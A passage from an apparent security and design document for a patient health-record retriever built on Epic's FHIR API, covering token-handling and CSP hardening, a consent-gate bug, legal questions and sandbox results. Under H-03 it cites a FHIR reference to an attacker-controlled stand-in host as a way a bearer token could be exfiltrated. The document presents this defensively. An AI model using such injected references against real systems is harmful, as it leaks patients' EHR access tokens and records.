once `EPIC_CLIENT_ID` is set, so the token stops being a control the moment the flow opens —
the gate exists only for the closed period. The residual is real but bounded: the token is
public in git history, so anyone reading the repository can reach the retriever SPA on the
production origin today. That grants no access to anyone's data, because the EHR still performs
its own authentication. If a gate is ever needed again, the value must be rotated into a
Worker secret first; the committed one can never be reused.

**H-02.** The authorization code and `state` are now stripped with `history.replaceState` the
moment they are read, on both the success and error paths. The code is single-use and
short-lived, but until exchanged it is a bearer credential for that patient's record, and it
was otherwise persisting in history, copied links, screenshots, and edge logs. `replaceState`
rather than `pushState` so Back cannot return to a URL that re-triggers the exchange.

**H-03 was the most serious.** The crawler follows references and attachment URLs out of FHIR
content, FHIR content may carry absolute URLs, and every fetch attached the bearer token. A
resource containing `"reference": "https://attacker.example/x"` would have sent a live EHR
access token to that host — worse than leaking the record, since the token can be replayed to
fetch the record again. `isTokenAllowedUrl()` now requires `https:` and an origin match against
the FHIR base, enforced at the single line that attaches the header. Off-origin URLs are
skipped rather than fetched without the token: fetching at all would still disclose which
resources this patient has.

**H-04.** `script-src` dropped `'unsafe-inline'` — the two inline blocks moved to
`/js/landing.js` and `/js/terms.js` — so an HTML injection that got through has no way to
execute. `connect-src` narrowed from `*` to `https:`; it cannot be `'self'` because the
retriever must reach whichever of ~1,300 brands the user picks, but a token must never leave
over plaintext. Added `object-src 'none'`, `frame-src 'none'`, `Permissions-Policy` denying
every device and sensor, and `Cross-Origin-Opener-Policy`/`Cross-Origin-Resource-Policy` at
`same-origin` — nothing needs an opener now that record delivery is gone. `style-src` keeps
`'unsafe-inline'`: the pages carry hundreds of `style=""` attributes and rewriting them buys
much less than the script-src change did.

**A defect the CSP work surfaced.** Moving the gate script out of the page made it testable in
isolation, which exposed that the consent gate unlocked only when the end of the warning
*intersected* the viewport. Jumping past it — End, a scrollbar drag, an in-page link — left the
checkbox permanently disabled with no way to proceed. That hit reduced-motion users hardest:
`scroll-behavior` is `auto` for them, so End jumps instantly instead of animating through the
warning, and the page was unusable for exactly the audience the warning-first design exists to
serve. Measured on the live page, the sentinel sat 5,071px above the viewport after such a
jump, so the old test could never fire. The gate is now position-based: reaching *or passing*
the end of the warning satisfies it.

## 10. Open questions

- **Does the FTC Health Breach Notification Rule (16 CFR Part 318) apply?** It covers vendors
  of personal health records *not* covered by HIPAA. A static site that never receives or
  holds health data is arguably outside it — but "arguably" is doing work in that sentence.
  Confirm with counsel — see §9.1, which makes this material.
- **Jurisdiction / governing law clause?**
- **Do we want an incident contact address**, even though we hold no data?

---

## 11. Legal review checklist

Bring to counsel:

- [ ] Warning language — is it sufficient to establish informed consent?
- [ ] Liability disclaimer — enforceability in the operating jurisdiction
- [ ] Whether the consent checkbox creates an enforceable agreement
- [ ] Entity structure — the named operator is decided (§9.2), but whether it should
      remain an individual rather than an entity is still a question for counsel
- [ ] FTC Health Breach Notification Rule applicability (§10)
- [ ] Duty of care arising from offering this publicly (§9.1)
- [ ] Accuracy of every statutory citation in §4.2 and §4.8
- [ ] Epic's requirements for a Public Documentation URL and any terms attached to app
      registration

---

## Appendix: what prompted this

Built after using the upstream tool to assemble a personal record across two health systems.
Three things surfaced that this plan responds to:

1. **Attachment ingestion was not idempotent** — re-running an import duplicated every note
   and PDF. Fixed upstream in PR #10.
2. **Records from different health systems were indistinguishable once merged** — no
   provenance column. Fixed by `--source`.
3. **The bundled brand directory was 17 months stale**, pointing at a decommissioned Mayo
   Clinic endpoint, and failed with an unhelpful error. §5 exists so this cannot recur here.

### 7.5 Fixes verified against the sandbox (2026-09-01)

All three §7.4 defects fixed and re-run end to end. Worker version `1177e508`.

| | Before | After |
|---|---|---|
| Console errors | 70 | 25 |
| Application-level errors | 45 | **0** |
| Resources | 325 | 326 |
| Attachments with content | 5/5 | 5/5 |

Every remaining error is Chrome's own network-layer `Failed to load resource` line, emitted by
the browser rather than by our code, and each is paired 1:1 with a `Skipped …` warning from
the retriever. Nothing in the run now reports a fault we could act on.

**The URL bug was causing the search failures.** This corrects §7.4's second finding. With the
doubled slash removed, `CarePlan`, `Specimen` and `Observation?category=mental-health` all
stopped returning `400 Unknown parameter: PATIENT` and now succeed — the +1 resource is a
mental-health Observation that had been silently missing from every prior pull. Epic was not
rejecting the `patient` parameter; it was mis-parsing `…/R4//CarePlan?patient=…`, and the
diagnostic it returned pointed at the wrong half of the request.

**Practitioner and Organization stay out of the initial searches regardless.** Neither defines
a `patient` search parameter in FHIR R4, so that query is malformed independently of the slash,
and searching them unscoped would pull the server's entire directory. Their counts are
unchanged at 11 and 3 — reference-following already covers them, as it always did.

The one genuinely unfixable case is the `Procedure` 400. Its id is 66 characters, but so is the
id of the Procedure that retrieves successfully, and 261 resources in this pull carry ids up to
88 characters. It is Epic sandbox data, not a length limit and not a request we build wrong, so
it is classified as a skip.
